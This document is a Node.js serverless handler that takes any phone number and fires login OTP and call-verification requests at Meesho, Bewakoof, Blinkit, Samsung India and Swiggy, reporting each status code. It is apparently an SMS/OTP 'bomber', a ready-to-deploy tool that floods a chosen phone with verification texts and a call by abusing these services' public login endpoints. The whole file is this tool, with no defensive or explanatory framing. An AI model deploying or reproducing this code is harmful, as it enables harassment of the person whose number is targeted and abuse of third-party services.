const fetch = require("node-fetch");

exports.handler = async (event) => {
  const method = event.httpMethod;
  let phone;

  if (method === "GET") {
    phone = event.queryStringParameters.phone;
  } else if (method === "POST") {
    phone = JSON.parse(event.body || "{}").phone;
  }

  if (!phone) {
    return {
      statusCode: 400,
      body: JSON.stringify({ error: "Missing phone number" }),
    };
  }

  let results = [];

  // 1. Meesho
  try {
    const meesho = await fetch("https://www.meesho.com/api/v1/user/login/request-otp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone_number: phone }),
    });
    results.push({ meesho: meesho.status });
  } catch (err) {
    results.push({ meesho: "error" });
  }

  // 2. Bewakoof
  try {
    const bewakoof = await fetch("https://api-prod.bewakoof.com/v3/user/auth/login/otp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ mobile: phone, country_code: "+91" }),
    });
    results.push({ bewakoof: bewakoof.status });
  } catch (err) {
    results.push({ bewakoof: "error" });
  }

  // 3. Blinkit
  try {
    const blinkit = await fetch("https://blinkit.com/v2/accounts/", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `user_phone=${phone}`,
    });
    results.push({ blinkit: blinkit.status });
  } catch (err) {
    results.push({ blinkit: "error" });
  }

  // 4. Samsung
  try {
    const samsung = await fetch("https://www.samsung.com/in/api/v1/sso/otp/init", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ user_id: phone }),
    });
    results.push({ samsung: samsung.status });
  } catch (err) {
    results.push({ samsung: "error" });
  }

  // 5. Swiggy
  try {
    const swiggy = await fetch("https://profile.swiggy.com/api/v3/app/request_call_verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ mobile: phone }),
    });
    results.push({ swiggy: swiggy.status });
  } catch (err) {
    results.push({ swiggy: "error" });
  }

  return {
    statusCode: 200,
    body: JSON.stringify({ phone, results }),
  };
};
